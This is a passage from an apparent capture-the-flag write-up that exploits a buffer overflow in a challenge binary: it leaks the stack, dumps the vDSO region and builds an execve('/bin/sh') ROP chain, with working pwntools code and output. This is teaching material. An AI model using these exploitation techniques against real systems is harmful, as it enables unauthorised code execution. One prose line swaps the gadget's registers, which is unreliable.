<span class="code-dark-red">0x0000000000401000</span> <span class="code-dark-red">0x0000000000402000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./challenge</span><span class="code-blue">  &lt;-  $rcx, $rip</span>
<span>0x0000000000402000</span> <span>0x0000000000403000</span> <span>0x0000000000001000</span> <span>0x0000000000002000</span> <span>r--</span> <span>./challenge</span>
<span>0x00007ffff7ff9000</span> <span>0x00007ffff7ffd000</span> <span>0x0000000000004000</span> <span>0x0000000000000000</span> <span>r--</span> <span>[vvar]</span>
<span class="code-dark-red">0x00007ffff7ffd000</span> <span class="code-dark-red">0x00007ffff7fff000</span> <span class="code-dark-red">0x0000000000002000</span> <span class="code-dark-red">0x0000000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">[vdso]</span>
<span class="code-dark-magenta">0x00007ffffffde000</span> <span class="code-dark-magenta">0x00007ffffffff000</span> <span class="code-dark-magenta">0x0000000000021000</span> <span class="code-dark-magenta">0x0000000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]<span class="code-blue">  &lt;-  $rbx, $rsp, $rsi</span>
<span class="code-dark-red">0xffffffffff600000</span> <span class="code-dark-red">0xffffffffff601000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">0x0000000000000000</span> <span class="code-dark-red">--x</span> <span class="code-dark-red">[vsyscall]
</code></pre></div><h3 id="vdso-region">vDSO region</h3><p>Notice that, appart from the binary, there is a region called <a href="https://www.man7.org/linux/man-pages/man7/vdso.7.html">vDSO</a> that is executable. This region allows the program to switch to kernel mode. It contains instructions, like any other binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>vdso -n
      0x7ffff7ffd6e0 <span>83ff01                  </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">cmp   </span> <span class="code-dark-cyan">edi</span><span>, <span class="code-dark-blue">1</span>
      0x7ffff7ffd6e3 <span>750e                    </span>   &lt;NO_SYMBOL&gt;   <span class="code-yellow">jne   </span> <span class="code-dark-blue">0x7ffff7ffd6f3</span>
      0x7ffff7ffd6e5 <span>0f01f9                  </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">rdtscp</span>
      0x7ffff7ffd6e8 <span>6690                    </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">nop</span>
      0x7ffff7ffd6ea <span>48c1e220                </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">shl   </span> <span class="code-dark-cyan">rdx</span><span>, <span class="code-dark-blue">0x20</span>
      0x7ffff7ffd6ee <span>4809d0                  </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">or    </span> <span class="code-dark-cyan">rax</span><span>, <span class="code-dark-cyan">rdx</span>
      0x7ffff7ffd6f1 <span>c3                      </span>   &lt;NO_SYMBOL&gt;   <span class="code-yellow">ret</span>
      0x7ffff7ffd6f2 <span>cc                      </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">int3</span>
      0x7ffff7ffd6f3 <span>83ff02                  </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">cmp   </span> <span class="code-dark-cyan">edi</span><span>, <span class="code-dark-blue">2</span>
      0x7ffff7ffd6f6 <span>7448                    </span>   &lt;NO_SYMBOL&gt;   <span class="code-yellow">je    </span> <span class="code-dark-blue">0x7ffff7ffd740</span>
      0x7ffff7ffd6f8 <span>83ff03                  </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">cmp   </span> <span class="code-dark-cyan">edi</span><span>, <span class="code-dark-blue">3</span>
      0x7ffff7ffd6fb <span>7409                    </span>   &lt;NO_SYMBOL&gt;   <span class="code-yellow">je    </span> <span class="code-dark-blue">0x7ffff7ffd706</span>
      0x7ffff7ffd6fd <span>48c7c0ffffffff          </span>   &lt;NO_SYMBOL&gt;   <span class="code-dark-yellow">mov   </span> <span class="code-dark-cyan">rax</span><span>, <span class="code-dark-blue">0xffffffffffffffff</span>  
      0x7ffff7ffd704 <span>c3                      </span>   &lt;NO_SYMBOL&gt;   <span class="code-yellow">ret</span>
      ...
</code></pre></div><p>The base address of the vDSO region is located on the stack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>find 0x00007ffff7ffd000
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\x00\xd0\xff\xf7\xff\x7f\x00\x00</span>' in whole memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>' (0x7ffffffde000-0x7ffffffff000 [rw-])
  0x7fffffffe9b0:    <span class="code-grey">00</span> <span class="code-dark-yellow">d0</span> <span class="code-dark-green">ff</span> <span class="code-dark-yellow">f7</span> <span class="code-dark-green">ff</span> <span class="code-dark-yellow">7f</span> <span class="code-grey">00</span> <span class="code-grey">00</span>  <span>33</span> <span class="code-grey">00</span> <span class="code-grey">00</span> <span class="code-grey">00</span> <span class="code-grey">00</span> <span class="code-grey">00</span> <span class="code-grey">00</span> <span class="code-grey">00</span>    |  ........3.......  |  
</code></pre></div><p>The idea here is to dump the vDSO region and look for more ROP gadgets to exploit the binary.</p><p>Now, it makes sense why the remote kernel is different to the provided one. We are given a kernel image just to find a way to dump the vDSO region using the vulnerable program. Then, we will need to find ROP gadgets in the remote vDSO region and finally exploit the remote instance.</p><h2 id="exploit-development">Exploit development</h2><p>As can be seen, the program leaks stack addresses:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">./challenge</span> | <span class="code-dark-green">xxd</span>
asdf
00000000: 5765 6c63 6f6d 6521 0a61 7364 660a 0000  Welcome!.asdf...  
00000010: 0000 0000 0000 0000 00a7 1040 0000 0000  ...........@....
00000020: 0009 0000 0000 0000 00b0 1040 0000 0000  ...........@....
00000030: 0001 0000 0000 0000 0072 1be7 7bfe 7f00  .........r..{...
00000040: 0000 0000 0000 0000 007e 1be7 7bfe 7f00  .........~..{...
00000050: 0089 1be7 7bfe 7f00 009b 1be7 7bfe 7f00  ....{.......{...
00000060: 00b6 1be7 7bfe 7f00 00e9 1be7 7bfe 7f00  ....{.......{...
00000070: 00f4 1be7 7bfe 7f00 001e 1ce7 7bfe 7f00  ....{.......{...
</code></pre></div><p>We can start writing the exploit to take some stack address:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'challenge'</span>

<span class="mtk1">io</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Welcome!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1">)</span>
<span class="mtk1">stack_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (u64(</span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()[</span><span class="mtk7 mtki">0x</span><span class="mtk6">30</span><span class="mtk1">:</span><span class="mtk7 mtki">0x</span><span class="mtk6">38</span><span class="mtk1">]) </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk5">~</span><span class="mtk7 mtki">0x</span><span class="mtk6">fff</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1000</span>  
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Stack address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">stack_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>With this, we have a stack address:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">python3</span> <span class="mtku">dump.py</span>
[<span class="code-blue">*</span>] './challenge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './challenge': pid 1195521  
[<span class="code-blue">*</span>] Stack address: 0x7ffd71a35000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span>
</code></pre></div><p>Now, we can exploit the Buffer Overflow vulnerability to call <code>write</code> with a greater size in <code>$rdx</code>. Notice that the values of <code>$rsi</code> and <code>$rdx</code> are taken from the stack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">000000000040101b &lt;write&gt;:
  40101b:       48 8b 74 24 10          mov    rsi,QWORD PTR [rsp+0x10]  
  401020:       48 8b 54 24 08          mov    rdx,QWORD PTR [rsp+0x8]
  401025:       48 c7 c7 01 00 00 00    mov    rdi,0x1
  40102c:       48 c7 c0 01 00 00 00    mov    rax,0x1
  401033:       0f 05                   syscall
  401035:       c3                      ret
</code></pre></div><h3 id="dumping-vdso">Dumping vDSO</h3><p>As a result, we can take the previous stack address and start dumping memory from that. Once we have enough data from the stack, we can start looking the a pointer that looks like the vDSO base address (something like <code>0x7ff......000</code>). The following code performs the previous process:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">find_vdso</span><span class="mtk1">(</span><span class="mtk9 mtki">haystack</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk9 mtki">haystack</span><span class="mtk1">), </span><span class="mtk6">8</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk9 mtki">haystack</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1"> : </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">].ljust(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">36</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk1">stack_addr</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">36</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">7ff</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">fff</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk1">stack_addr</span><span class="mtk1">:</span>  
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">addr</span>

<span class="mtk1">stack</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span>
<span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span>

<span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> (</span><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">:=</span><span class="mtk1"> </span><span class="mtk8">find_vdso</span><span class="mtk1">(</span><span class="mtk1">stack</span><span class="mtk1">)):</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span>context.binary.sym.write<span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401094</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">1800</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">stack_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">offset</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1800</span>
<span class="mtk1">    </span><span class="mtk1">stack</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Welcome!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>

<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'vDSO address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">vdso_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>Notice that <code>0x401094</code> is an address within the <code>_start</code> function, just after <code>seccomp</code> rules are configured.</p><p>As a result, we get the vDSO base address:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">python3</span> <span class="mtku">dump.py</span>
[<span class="code-blue">*</span>] './challenge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './challenge': pid 1198598  
[<span class="code-blue">*</span>] Stack address: 0x7fff529be000
[<span class="code-green">+</span>] vDSO address: 0x7fff529ca000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span>
</code></pre></div><p>At this point, we simply use the same method to dump the vDSO region (which has a size of <code>0x2000</code> bytes) and save it to a file:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.write)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401094</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">2000</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">vdso_addr</span><span class="mtk1">)</span>  
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvn</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">80</span><span class="mtk1">)</span>

<span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'vdso'</span><span class="mtk1">, </span><span class="mtk4">'wb'</span><span class="mtk1">) </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Welcome!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">))</span>
</code></pre></div><p>With this, we have successfully dumped the vDSO region:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">python3</span> <span class="mtku">dump.py</span>
[<span class="code-blue">*</span>] './challenge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './challenge': pid 1200970
[<span class="code-blue">*</span>] Stack address: 0x7ffc41f80000
[<span class="code-green">+</span>] vDSO address: 0x7ffc41fb4000
[<span class="code-blue">*</span>] Stopped process './challenge' (pid 1200970)

<span class="code-red">#</span> <span class="code-dark-green">file</span> <span class="mtku">vdso</span>
vdso: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=8ec5722947270e86e99b1821ecca259093c925b8, stripped  

<span class="code-red">#</span> <span class="code-dark-green">xxd</span> <span class="mtku">vdso</span> | <span class="code-dark-green">head</span>
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 0000 0000 0000 0000  ..&gt;.............
00000020: 4000 0000 0000 0000 980e 0000 0000 0000  @...............
00000030: 0000 0000 4000 3800 0400 4000 1000 0f00  ....@.8...@.....
00000040: 0100 0000 0500 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: cd0d 0000 0000 0000 cd0d 0000 0000 0000  ................
00000070: 0010 0000 0000 0000 0200 0000 0400 0000  ................
00000080: e003 0000 0000 0000 e003 0000 0000 0000  ................
00000090: e003 0000 0000 0000 2001 0000 0000 0000  ........ .......
</code></pre></div><p>Now, it&rsquo;s time to dump the remote vDSO file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">python3</span> <span class="mtku">dump.py</span> 94.237.62.195:51865
[<span class="code-blue">*</span>] './challenge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Opening connection to 94.237.62.195 on port 51865: Done  
[<span class="code-blue">*</span>] Stack address: 0x7ffeefcfe000
[<span class="code-green">+</span>] vDSO address: 0x7ffeefd50000
[<span class="code-blue">*</span>] Closed connection to 94.237.62.195 port 51865
</code></pre></div><h3 id="rop-chain">ROP chain</h3><p>Alright, now we can look at ROP gadgets inside the remote vDSO region:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vdso</span> --nojop | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': pop'</span>
0x0000000000000a37 <span class="code-red">: pop</span> r12 ; pop r13 ; pop rbp ; ret
0x00000000000007df <span class="code-red">: pop</span> r12 ; pop rbp ; ret
0x0000000000000a39 <span class="code-red">: pop</span> r13 ; pop rbp ; ret
0x0000000000000ba1 <span class="code-red">: pop</span> rax ; ret
0x00000000000007cb <span class="code-red">: pop</span> rbp ; mov qword ptr [r9], rax ; xor eax, eax ; ret
0x0000000000000a3a <span class="code-red">: pop</span> rbp ; pop rbp ; ret
0x00000000000007e1 <span class="code-red">: pop</span> rbp ; ret
0x00000000000007d9 <span class="code-red">: pop</span> rbx ; mov eax, 0xffffffff ; pop r12 ; pop rbp ; ret  
0x00000000000008c6 <span class="code-red">: pop</span> rbx ; pop r12 ; pop rbp ; ret
0x0000000000000ba0 <span class="code-red">: pop</span> rdx ; pop rax ; ret
0x0000000000000a38 <span class="code-red">: pop</span> rsp ; pop r13 ; pop rbp ; ret
0x00000000000007e0 <span class="code-red">: pop</span> rsp ; pop rbp ; ret
</code></pre></div><p>We can easily control <code>$rax</code>, which is needed to perform any <code>syscall</code> instruction. Moreover, we can control <code>$rdx</code>, <code>$rbx</code>, <code>$r12</code> and <code>$r13</code>.</p><p>There are other gadgets to set <code>$rdi</code> and <code>$rsi</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vdso</span> --nojop | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': mov rdi'</span>
0x00000000000008e3 <span class="code-red">: mov rdi</span>, rbx ; mov rsi, r12 ; syscall  
</code></pre></div><p>With these gadgets, we can execute <code>sys_execve</code>. We need:</p><ul><li><code>$rax = 0x3b</code> (<code>sys_execve</code>)</li><li><code>$rdi</code> to have a pointer to the string <code>"/bin/sh"</code> (it can be loaded on the stack)</li><li><code>$rsi = 0</code></li><li><code>$rdx = 0</code></li></ul><p>First of all, since we need <code>"/bin/sh"</code> loaded somewhere, we will use the Buffer Overflow vulnerabilty to call <code>read</code> to store the string at an arbitrary offset on the stack:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bin_sh_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stack_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2000</span>

<span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.read)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401094</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>  
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Welcome!</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>Now we will define the following ROP chain. Notice that <code>$rbx</code> is moved to <code>$rsi</code> and <code>$r12</code> to <code>$rdi</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">pop_rdx_pop_rax_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">ba0</span>
<span class="mtk1">pop_rbx_pop_r12_pop_rbp_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">8c6</span>
<span class="mtk1">mov_rdi_rbx_mov_rsi_r12_syscall</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">8e3</span>  

<span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdx_pop_rax_ret</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">3b</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rbx_pop_r12_pop_rbp_ret</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">mov_rdi_rbx_mov_rsi_r12_syscall</span><span class="mtk1">)</span>

<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
